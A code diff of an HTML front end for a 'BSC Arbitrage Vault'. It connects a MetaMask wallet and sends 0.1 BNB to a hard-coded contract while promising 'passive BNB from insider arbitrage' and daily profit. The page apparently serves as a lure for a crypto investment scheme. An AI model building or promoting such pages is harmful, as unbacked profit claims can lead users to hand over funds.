@@ -1,18 +1,77 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>BSC Auto Rebalance Vault</title>
+  <meta charset="UTF-8">
+  <title>BSC Arbitrage Vault</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #111;
+      color: #0f0;
+      text-align: center;
+      padding-top: 100px;
+    }
+    button {
+      background-color: #0f0;
+      color: #111;
+      padding: 15px 30px;
+      border: none;
+      font-size: 16px;
+      margin: 10px;
+      cursor: pointer;
+    }
+    h1, h2 {
+      color: #0f0;
+    }
+  </style>
 </head>
 <body>
-  <h1>🚀 BSC Auto Rebalance Vault</h1>
-  <p>Earn daily profit from automated arbitrage on PancakeSwap & ApeSwap.</p>
-  
-  <button id="connectBtn">Connect Wallet</button>
-  <button id="depositBtn">Deposit 0.1 BNB</button>
+  <h1>💰 BSC Auto Rebalance Vault</h1>
+  <h2>Earn passive BNB from insider arbitrage!</h2>
+  <p>Connect your wallet and deposit to join the automated profit engine.</p>
+  <button onclick="connectWallet()">🔌 Connect Wallet</button>
+  <button onclick="depositBNB()">📤 Deposit 0.1 BNB</button>
 
-  <!-- Load ethers.js -->
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <!-- Load your logic -->
-  <script src="script.js"></script>
+  <script>
+    const CONTRACT_ADDRESS = "0x9F62B94bDD46D75Ef6e170D75F7E34493FE0Eea8";
+
+    async function connectWallet() {
+      if (typeof window.ethereum !== "undefined") {
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          alert("✅ Wallet connected!");
+        } catch (err) {
+          alert("❌ Connection rejected.");
+        }
+      } else {
+        alert("❌ MetaMask not found.");
+      }
+    }
+
+    async function depositBNB() {
+      if (typeof window.ethereum === "undefined") {
+        alert("❌ MetaMask not found.");
+        return;
+      }
+
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const signer = provider.getSigner();
+
+      const contract = new ethers.Contract(CONTRACT_ADDRESS, [
+        "function arbitrage() external payable"
+      ], signer);
+
+      try {
+        const tx = await contract.arbitrage({ value: ethers.utils.parseEther("0.1") });
+        alert("⏳ Transaction sent... waiting");
+        await tx.wait();
+        alert("✅ BNB deposited to vault.");
+      } catch (err) {
+        alert("❌ Transaction failed.");
+        console.error(err);
+      }
+    }
+  </script>
 </body>
 </html>
